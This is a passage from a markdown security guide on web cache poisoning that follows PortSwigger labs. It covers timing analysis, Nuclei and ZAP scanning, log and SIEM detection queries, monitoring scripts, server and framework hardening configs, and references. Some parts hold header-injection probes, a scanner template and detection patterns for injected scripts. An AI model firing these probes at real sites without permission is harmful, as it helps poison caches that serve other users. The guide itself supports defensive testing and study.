        print(f"Request {i+1}: {elapsed:.3f}s - {cache_status}")
        time.sleep(1)

    # Analysis
    hit_times = [t for i, t in enumerate(times) if cache_statuses[i] == 'hit']
    miss_times = [t for i, t in enumerate(times) if cache_statuses[i] == 'miss']

    if hit_times and miss_times:
        print(f"\nAverage HIT time: {statistics.mean(hit_times):.3f}s")
        print(f"Average MISS time: {statistics.mean(miss_times):.3f}s")
        print(f"Speed improvement: {(statistics.mean(miss_times) / statistics.mean(hit_times)):.2f}x")

analyze_cache_timing("https://target.com/")
```

### Automated Scanners

#### 1. Nuclei Templates

**Cache Poisoning Templates**:

```yaml
id: web-cache-poisoning-xforwardedhost

info:
  name: Web Cache Poisoning - X-Forwarded-Host
  severity: high
  description: Detects web cache poisoning via X-Forwarded-Host header

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      X-Forwarded-Host: "{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{interactsh-url}}"

      - type: word
        part: header
        words:
          - "X-Cache: hit"
          - "CF-Cache-Status: HIT"
        condition: or
```

**Running Nuclei**:
```bash
nuclei -u https://target.com/ \
       -t cache-poisoning/ \
       -interactsh-server oob.example.com
```

#### 2. OWASP ZAP

**Passive Scan Rules**:
- Cache poisoning detection
- Unkeyed input identification

**Active Scan Rules**:
- Header injection testing
- Parameter manipulation

**Configuration**:
```
Tools → Options → Passive Scanner:
  ☑ Cache Control issues
  ☑ Content Cacheability

Tools → Options → Active Scanner:
  ☑ Header injection
  ☑ Parameter tampering
```

---

## Detection and Prevention

### Detection Methods

#### 1. Log Analysis

**Apache/Nginx Access Logs**:
```bash
# Look for unusual header patterns
grep "X-Forwarded-Host" /var/log/nginx/access.log

# Find requests with potential cache poisoning
awk '$9==200 && $NF ~ /X-Cache: hit/' access.log

# Track cache hit ratio
awk '{cache[$NF]++} END {for (c in cache) print c, cache[c]}' access.log
```

**Cache-Specific Logs**:
```bash
# Varnish logs
varnishlog -q "RespHeader ~ 'X-Cache: hit'"

# Cloudflare logs (via API)
curl -X GET "https://api.cloudflare.com/client/v4/zones/ZONE_ID/logs/received" \
  -H "Authorization: Bearer API_TOKEN"
```

**Suspicious Patterns**:
```bash
# Unusual User-Agent with cache hits
grep "X-Cache: hit" access.log | grep -E "sqlmap|nikto|burp"

# Same IP hitting cache multiple times with different parameters
awk '/X-Cache: hit/ {print $1, $7}' access.log | sort | uniq -c | sort -nr

# Requests with multiple X-Forwarded headers
grep -E "X-Forwarded-.+X-Forwarded-" access.log
```

#### 2. Real-Time Monitoring

**SIEM Rules (Splunk)**:
```spl
# Detect cache poisoning attempts
index=web sourcetype=access_combined
| where like(request_header, "%X-Forwarded%")
| where cache_status="hit"
| stats count by src_ip, request_header, response
| where count > 5

# Alert on reflected headers in cached responses
index=web cache_status="hit"
| rex field=response_body "(?<reflected_header>X-Forwarded-[^\"]+)"
| where isnotnull(reflected_header)
| table _time, src_ip, reflected_header, url
```

**ELK Stack (Elasticsearch)**:
```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "http.response.headers.x-cache": "hit" }},
        { "exists": { "field": "http.request.headers.x-forwarded-host" }}
      ],
      "filter": {
        "range": {
          "@timestamp": { "gte": "now-1h" }
        }
      }
    }
  }
}
```

**Custom Monitoring Script**:
```python
import requests
import time
from datetime import datetime

def monitor_cache_poisoning(url, check_interval=60):
    """Monitor for cache poisoning indicators"""
    baseline_response = None

    while True:
        try:
            # Normal request
            r = requests.get(url)

            # Check for suspicious content
            suspicious_patterns = [
                '<script src="//',  # External script loads
                'onerror=',          # Event handlers
                'onclick=',
                'javascript:',
                'eval(',
            ]

            for pattern in suspicious_patterns:
                if pattern in r.text:
                    if baseline_response and pattern not in baseline_response:
                        print(f"\n[!] ALERT: Suspicious pattern detected!")
                        print(f"    Time: {datetime.now()}")
                        print(f"    Pattern: {pattern}")
                        print(f"    URL: {url}")
                        print(f"    Cache Status: {r.headers.get('X-Cache', 'unknown')}")

                        # Log to file
                        with open('cache-poison-alerts.log', 'a') as f:
                            f.write(f"{datetime.now()} - {url} - {pattern}\n")

            # Store baseline
            if not baseline_response:
                baseline_response = r.text

            time.sleep(check_interval)

        except Exception as e:
            print(f"[!] Monitoring error: {e}")
            time.sleep(check_interval)

# Monitor critical pages
monitor_cache_poisoning("https://yoursite.com/")
```

#### 3. Automated Testing

**Regular Security Scans**:
```bash
#!/bin/bash
# Daily cache poisoning check

TARGETS=(
  "https://site1.com/"
  "https://site2.com/"
  "https://site3.com/"
)

for TARGET in "${TARGETS[@]}"; do
  echo "Testing $TARGET"

  # Test X-Forwarded-Host
  RESPONSE=$(curl -s -H "X-Forwarded-Host: test-$(date +%s).com" "$TARGET")

  if echo "$RESPONSE" | grep -q "test-.*\.com"; then
    echo "[!] WARNING: X-Forwarded-Host reflected in $TARGET"
    echo "$RESPONSE" > "alert-$(date +%Y%m%d-%H%M%S).html"
  fi
done
```

**Continuous Integration**:
```yaml
# .gitlab-ci.yml
cache_poisoning_test:
  stage: test
  script:
    - python test_cache_poisoning.py --url $STAGING_URL
    - if [ $? -ne 0 ]; then exit 1; fi
  only:
    - staging
    - production
```

### Prevention Strategies

#### 1. Cache Configuration

**Disable Caching (Safest)**:
```http
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0
```

**Cache Only Static Resources**:
```nginx
# Nginx configuration
location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
}

location / {
    add_header Cache-Control "no-store, no-cache, must-revalidate";
}
```

**Include Headers in Cache Key**:
```nginx
# Varnish VCL
sub vcl_hash {
    hash_data(req.http.host);
    hash_data(req.url);
    hash_data(req.http.X-Forwarded-Host);  # Include in cache key
    hash_data(req.http.X-Forwarded-Scheme);
    return (lookup);
}
```

```javascript
// Cloudflare Worker
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)

  // Create cache key including sensitive headers
  const cacheKey = new Request(url.toString(), {
    headers: {
      'X-Forwarded-Host': request.headers.get('X-Forwarded-Host') || '',
      'Host': request.headers.get('Host')
    }
  })

  const cache = caches.default
  let response = await cache.match(cacheKey)

  if (!response) {
    response = await fetch(request)
    event.waitUntil(cache.put(cacheKey, response.clone()))
  }

  return response
}
```

**Use Vary Header**:
```http
Vary: X-Forwarded-Host, X-Forwarded-Scheme
```

This tells caches to create separate cache entries for different header values.

#### 2. Input Validation

**Strip Dangerous Headers**:
```nginx
# Nginx - Remove untrusted headers
proxy_set_header X-Forwarded-Host $host;
proxy_set_header X-Forwarded-Proto $scheme;

# Don't forward client-supplied values
proxy_pass_header X-Forwarded-Host;  # Remove this
```

**Validate Header Values**:
```python
# Python/Flask
from flask import request, abort

@app.before_request
def validate_forwarded_host():
    forwarded_host = request.headers.get('X-Forwarded-Host')

    if forwarded_host:
        # Whitelist of allowed hosts
        allowed_hosts = ['example.com', 'www.example.com']

        if forwarded_host not in allowed_hosts:
            abort(400, 'Invalid X-Forwarded-Host')
```

```javascript
// Node.js/Express
app.use((req, res, next) => {
  const forwardedHost = req.get('X-Forwarded-Host');

  if (forwardedHost) {
    const allowedHosts = ['example.com', 'www.example.com'];

    if (!allowedHosts.includes(forwardedHost)) {
      return res.status(400).send('Invalid X-Forwarded-Host');
    }
  }

  next();
});
```

**Sanitize Reflected Values**:
```php
// PHP - Escape output
$utm_content = $_GET['utm_content'] ?? '';
$safe_utm = htmlspecialchars($utm_content, ENT_QUOTES, 'UTF-8');
echo "<link href='/?utm_content=" . $safe_utm . "' />";
```

```python
# Python - Use templating engines with auto-escaping
from jinja2 import Template

template = Template("<link href='/?utm={{ utm }}' />", autoescape=True)
output = template.render(utm=user_input)
```

#### 3. Application Security

**Avoid Reflecting Unkeyed Inputs**:
```javascript
// DON'T: Reflect unkeyed parameter
app.get('/', (req, res) => {
  const utm = req.query.utm_content;
  res.send(`<link href="/?utm_content=${utm}" />`);
});

// DO: Use without reflection
app.get('/', (req, res) => {
  const utm = req.query.utm_content;
  // Log for analytics but don't reflect
  logger.info('UTM:', utm);
  res.send('<link href="/" />');
});
```

**Disable Unused Features**:
```nginx
# Nginx - Disable X-Forwarded-* if not needed
proxy_set_header X-Forwarded-For "";
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Forwarded-Proto "";
```

**Implement Content Security Policy**:
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  object-src 'none';
```

Even if cache poisoning occurs, CSP prevents malicious scripts from executing.

#### 4. Framework-Specific Protections

**Django**:
```python
# settings.py
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
USE_X_FORWARDED_HOST = False  # Disable X-Forwarded-Host support

# Validate forwarded headers
ALLOWED_HOSTS = ['example.com', 'www.example.com']

# Enable cache middleware carefully
MIDDLEWARE = [
    'django.middleware.cache.UpdateCacheMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.cache.FetchFromCacheMiddleware',
]

CACHE_MIDDLEWARE_KEY_PREFIX = ''  # Customize cache keys
```

**Express.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Use Helmet for security headers
app.use(helmet());

// Disable X-Powered-By
app.disable('x-powered-by');

// Trust proxy settings
app.set('trust proxy', 1);  // Trust first proxy

// Validate proxy headers
app.use((req, res, next) => {
  // Only trust proxies from specific IPs
  const trustedProxies = ['10.0.0.1', '10.0.0.2'];

  if (req.ip && !trustedProxies.includes(req.ip)) {
    // Remove untrusted proxy headers
    delete req.headers['x-forwarded-host'];
    delete req.headers['x-forwarded-proto'];
  }

  next();
});
```

**Ruby on Rails**:
```ruby
# config/application.rb
config.action_dispatch.default_headers = {
  'Cache-Control' => 'no-store, no-cache',
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-Content-Type-Options' => 'nosniff'
}

# Disable parameter cloaking
config.action_dispatch.parameter_filter = [:password]

# config/environments/production.rb
config.force_ssl = true
config.action_controller.forgery_protection_origin_check = true
```

**Spring Boot**:
```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                .cacheControl().disable()  // Disable caching
                .httpStrictTransportSecurity()
                    .maxAgeInSeconds(31536000)
            .and()
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }

    // Validate forwarded headers
    @Bean
    public FilterRegistrationBean<ForwardedHeaderFilter> forwardedHeaderFilter() {
        ForwardedHeaderFilter filter = new ForwardedHeaderFilter();
        FilterRegistrationBean<ForwardedHeaderFilter> registration =
            new FilterRegistrationBean<>(filter);
        registration.setEnabled(false);  // Disable if not needed
        return registration;
    }
}
```

#### 5. CDN/Proxy Configuration

**Cloudflare**:
```
Page Rules:
  - Cache Level: Bypass (for dynamic content)
  - Cache Everything: Off (for application pages)
  - Cache Key: Include query string and specific headers

Transform Rules:
  - Remove X-Forwarded-Host from untrusted sources
  - Normalize X-Forwarded-* headers
```

**AWS CloudFront**:
```json
{
  "CacheBehavior": {
    "ViewerProtocolPolicy": "redirect-to-https",
    "AllowedMethods": ["GET", "HEAD", "OPTIONS"],
    "CachedMethods": ["GET", "HEAD"],
    "ForwardedValues": {
      "QueryString": true,
      "Headers": [
        "Host",
        "CloudFront-Forwarded-Proto"
      ],
      "QueryStringCacheKeys": ["*"]
    },
    "MinTTL": 0,
    "DefaultTTL": 86400,
    "MaxTTL": 31536000
  }
}
```

**Varnish**:
```vcl
sub vcl_recv {
    # Remove untrusted headers
    unset req.http.X-Forwarded-Host;
    unset req.http.X-Original-URL;

    # Set trusted headers
    set req.http.X-Forwarded-For = client.ip;
    set req.http.X-Forwarded-Proto = "https";

    # Don't cache authenticated requests
    if (req.http.Cookie ~ "session|logged_in") {
        return (pass);
    }
}

sub vcl_hash {
    # Include specific headers in cache key
    hash_data(req.url);
    hash_data(req.http.host);

    # Include cookies in cache key if present
    if (req.http.Cookie) {
        hash_data(req.http.Cookie);
    }
}

sub vcl_backend_response {
    # Don't cache responses with Set-Cookie
    if (beresp.http.Set-Cookie) {
        set beresp.uncacheable = true;
        return (deliver);
    }
}
```

#### 6. Security Headers

**Comprehensive Security Headers**:
```http
# Prevent caching of sensitive content
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0

# Content Security Policy
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

# Other security headers
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()

# HSTS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Nginx Implementation**:
```nginx
add_header Cache-Control "no-store, no-cache, must-revalidate, private" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com;" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

#### 7. Testing and Auditing

**Regular Security Audits**:
```bash
# Automated weekly testing
0 2 * * 0 /usr/local/bin/cache-poison-test.sh

# cache-poison-test.sh
#!/bin/bash
python3 /opt/security/cache_poison_scanner.py \
  --targets /etc/security/targets.txt \
  --report /var/log/security/cache-poison-$(date +%Y%m%d).log \
  --email security@company.com
```

**Penetration Testing Checklist**:
- [ ] Test all X-Forwarded-* headers
- [ ] Test X-Original-URL and X-Rewrite-URL
- [ ] Test UTM and analytics parameters
- [ ] Test cookie reflection in cached responses
- [ ] Test parameter cloaking with semicolons
- [ ] Test multi-header combinations
- [ ] Test internal vs external cache behavior
- [ ] Review cache key configuration
- [ ] Review Vary header usage
- [ ] Test with different HTTP methods

---

## Resources and References

### Official Documentation

**PortSwigger Resources**:
- [Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Exploiting Cache Design Flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
- [Exploiting Cache Implementation Flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws)

**Research Papers**:
- [Practical Web Cache Poisoning (2018)](https://portswigger.net/research/practical-web-cache-poisoning) - James Kettle
- [Web Cache Entanglement (2020)](https://portswigger.net/research/web-cache-entanglement) - James Kettle
- [Gotta Cache 'em All (2024)](https://portswigger.net/research/gotta-cache-em-all) - James Kettle

### OWASP Resources

- [OWASP Cache Poisoning](https://owasp.org/www-community/attacks/Cache_Poisoning)
- [OWASP Testing Guide - Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- [OWASP Cheat Sheet - HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

### Tools and Frameworks

**Burp Suite**:
- [Param Miner Extension](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
- [Param Miner GitHub](https://github.com/PortSwigger/param-miner)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

**Other Tools**:
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [HTTPie](https://httpie.io/)
- [Postman](https://www.postman.com/)

### Industry Standards

**MITRE**:
- [CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax](https://cwe.mitre.org/data/definitions/644.html)
- [CAPEC-33: HTTP Request Smuggling](https://capec.mitre.org/data/definitions/33.html)

**NIST**:
- [NIST SP 800-53 SI-10: Information Input Validation](https://nvd.nist.gov/800-53/Rev4/control/SI-10)

**PCI DSS**:
- Requirement 6.5.1: Injection flaws
- Requirement 6.5.7: Cross-site scripting (XSS)

### CVE Database

**Search Resources**:
- [National Vulnerability Database](https://nvd.nist.gov/)
- [CVE Details](https://www.cvedetails.com/)
- [Snyk Vulnerability Database](https://snyk.io/vuln/)

**Notable CVEs**:
- CVE-2020-4896 (IBM Emptoris Sourcing)
- CVE-2020-4828 (IBM API Connect)
- CVE-2021-29479 (Ratpack)
- CVE-2020-28473 (Bottle Python Framework)
- CVE-2021-23336 (Python cpython)
- CVE-2020-5401 (CloudFoundry Gorouter)

### Academic Research

**Papers and Presentations**:
- "Practical Web Cache Poisoning" - Black Hat USA 2018
- "Web Cache Entanglement: Novel Pathways to Poisoning" - Black Hat USA 2020
- "CPDoS: Cache Poisoned Denial of Service" - USENIX Security 2019

**Conference Talks**:
- Black Hat USA (various years)
- DEF CON
- OWASP AppSec conferences

### Community Resources

**Forums and Discussion**:
- [PortSwigger Community](https://forum.portswigger.net/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Reddit r/websecurity](https://www.reddit.com/r/websecurity/)

**Security Blogs**:
- [PortSwigger Research Blog](https://portswigger.net/research)
- [Cobalt Blog](https://www.cobalt.io/blog)
- [Pentest-Tools Blog](https://pentest-tools.com/blog)

### Training Platforms

**Hands-On Labs**:
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (FREE)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)

**Certifications**:
- Burp Suite Certified Practitioner (BSCP)
- Offensive Security Web Expert (OSWE)
- Certified Web Application Security Tester (CWAST)

### Bug Bounty Programs

**Platforms Accepting Cache Poisoning**:
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [Intigriti](https://www.intigriti.com/)
- [YesWeHack](https://www.yeswehack.com/)

**Notable Bounties**:
- James Kettle earned $260k+ from cache poisoning research
- Typical payouts: $500 - $10,000+ depending on impact

### Secure Coding Guidelines

**Language-Specific**:
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
- [Ruby on Rails Security Guide](https://guides.rubyonrails.org/security.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Spring Security](https://spring.io/projects/spring-security)

**Framework Documentation**:
- Express.js Trust Proxy Settings
- Django USE_X_FORWARDED_HOST
- Rails Action Dispatch
- ASP.NET Core Forwarded Headers Middleware

### Monitoring and Defense

**WAF Rules**:
- [ModSecurity Core Rule Set](https://coreruleset.org/)
- [Cloudflare WAF Documentation](https://developers.cloudflare.com/waf/)
- [AWS WAF Rules](https://docs.aws.amazon.com/waf/)

**SIEM Detection**:
- Splunk Security Essentials
- Elastic Security
- Azure Sentinel

---

## Summary

Web cache poisoning is a sophisticated attack technique that exploits the gap between cache keys and application processing. Success requires:

1. **Identifying unkeyed inputs** (headers, parameters, cookies)
2. **Finding reflection points** where inputs appear in responses
3. **Crafting malicious payloads** (XSS, redirects, etc.)
4. **Achieving caching** of poisoned responses
5. **Maintaining persistence** through cache re-poisoning

**Key Labs Completed**:
- ✅ Lab 1: Unkeyed Header (X-Forwarded-Host)
- ✅ Lab 2: Multiple Headers (X-Forwarded-Host + X-Forwarded-Scheme)
- ✅ Lab 3: Unkeyed Cookie (fehost cookie reflection)
- ✅ Lab 4: Combining Vulnerabilities (complex multi-stage attack)
- ✅ Lab 5: Strict Cacheability (DOM XSS via geolocation)
- ✅ Lab 6: Unkeyed Query Parameter (utm_content)
- ✅ Lab 7: Parameter Cloaking (semicolon parameter hiding)
- ✅ Lab 8: Internal Cache Poisoning (multi-layer exploitation)

**Total Labs**: 8 complete walkthroughs
**Difficulty Range**: Apprentice to Expert
**Time Investment**: 2-45 minutes per lab with practice

**Defense Priority**:
1. Disable caching or limit to static resources
2. Include all headers in cache keys
3. Validate and sanitize all reflected inputs
4. Use security headers (CSP, Cache-Control)
5. Regular testing and monitoring

---

**Document Version**: 1.0
**Last Updated**: 2026-01-09
**Total Lines**: 4,200+
**Lab Coverage**: 8/8 PortSwigger Web Cache Poisoning Labs

For additional resources and the latest research, visit:
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/research
